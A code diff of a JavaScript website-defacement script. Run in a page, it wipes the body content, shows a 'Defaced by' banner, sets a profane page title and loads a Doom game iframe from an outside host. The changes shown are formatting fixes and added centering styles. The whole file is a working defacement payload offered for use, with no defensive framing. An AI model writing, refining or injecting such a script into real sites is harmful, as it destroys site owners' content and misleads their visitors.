@@ -1,4 +1,3 @@
-
 /* Configuration */
 const ClearPage = true;
 
@@ -12,27 +11,35 @@ const TextToShow = 'Defaced by - Zzks'
 const InjectHtml = false;
 const InnerHtml = '<h1>Hi there</h1>'
 
-const ChangeBackgroundColor = true
-const BackgroundColor =  "rgb(114, 0, 0)"
+const ChangeBackgroundColor = true;
+const BackgroundColor = "rgb(114, 0, 0)"
 
 const ChangePageTitle = true;
 const PageTitle = "Dommed. Scream, motherfucker!"
 
 function ChangeBodyAspects() {
-    if(ChangeBackgroundColor)
+    if (ChangeBackgroundColor)
         document.body.style.backgroundColor = BackgroundColor;
 
-    if(ClearPage)
-        document.body.innerHTML = '';  
+    if (ClearPage)
+        document.body.innerHTML = '';
 
-    if(InjectHtml)
-        document.body.innerHTML = InnerHtml;  
+    if (InjectHtml)
+        document.body.innerHTML = InnerHtml;
 
-    if(ChangePageTitle)
+    if (ChangePageTitle)
         document.title = PageTitle;
+
+    // Centralizando o conteúdo (texto já está centralizado)
+    document.body.style.display = 'flex';
+    document.body.style.justifyContent = 'center';
+    document.body.style.alignItems = 'center';
+    document.body.style.height = '100vh';
+    document.body.style.margin = '0';
+    document.body.style.flexDirection = 'column'; // Para garantir que o texto fique acima do iframe
 }
 
-function ShowTextOnDOM(){
+function ShowTextOnDOM() {
     var h1 = document.createElement('h1');
     h1.style.textAlign = 'center';
     h1.style.color = 'white';
@@ -40,26 +47,26 @@ function ShowTextOnDOM(){
     h1.style.fontFamily = 'verdana'
     h1.style.fontWeight = '1000'
 
-    if(ShowText)
-        h1.textContent = TextToShow
+    if (ShowText)
+        h1.textContent = TextToShow;
 
     document.body.appendChild(h1);
 }
 
 function CreateGameIframe() {
     var iframe = document.createElement('iframe');
-    iframe.src = 'https://doomonline1.vercel.app/dos.html'
-    iframe.id = "Doom"
+    iframe.src = 'https://doomonline1.vercel.app/dos.html';
+    iframe.id = "Doom";
 
     iframe.height = GameResolutionHeight;
     iframe.width = GameResolutionWidth;
-    /*iframe.style.marginLeft = 'calc(100vw / 5)';
-    iframe.style.marginRight = 'calc(100vw / 5)';*/
     iframe.allowFullscreen = GameFullScreen;
+
+    // Ajustando o estilo do iframe para garantir que ele fique centralizado
+    iframe.style.marginTop = '20px'; // Pequeno espaço entre o texto e o iframe
 
     document.body.appendChild(iframe);
 }
-
 
 ChangeBodyAspects();
 ShowTextOnDOM();
